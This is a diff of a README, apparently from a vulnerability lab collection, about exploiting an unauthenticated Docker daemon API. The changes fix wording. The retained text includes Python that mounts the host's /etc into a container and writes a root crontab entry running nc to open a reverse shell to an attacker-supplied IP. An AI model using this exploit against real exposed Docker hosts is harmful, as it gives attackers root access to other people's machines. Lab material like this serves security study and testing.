@@ -1,4 +1,4 @@
-# docker daemon api unauthorized access exploit
+# Docker daemon api unauthorized access exploit
 
 [中文版本(Chinese version)](README.zh-cn.md)
 
@@ -8,18 +8,16 @@ Reference Links：
 
 ## Vulnerability environment
 
-Enter following command to build and run the vulnerability environment:
+Enter the following command to build and run the vulnerability environment:
 
 ```
 docker-compose build
 docker-compose up -d
 ```
 
-after the service started, the 2375 port was published to the host
-
 ## Exploit
 
-Start a container, and mount the host `/etc` folder to the container, then we have read/write access to any files.
+Start a container, and mount the host `/etc` folder to the container, then we will have read/write access to any files.
 
 We can put the commands in crontab configuration file to reverse shell
 
@@ -30,6 +28,6 @@ client = docker.DockerClient(base_url='http://your-ip:2375/')
 data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
 ```
 
-reverse shell success：
+Reverse shell exploit by injecting commands in crontab:
 
 ![](1.png)
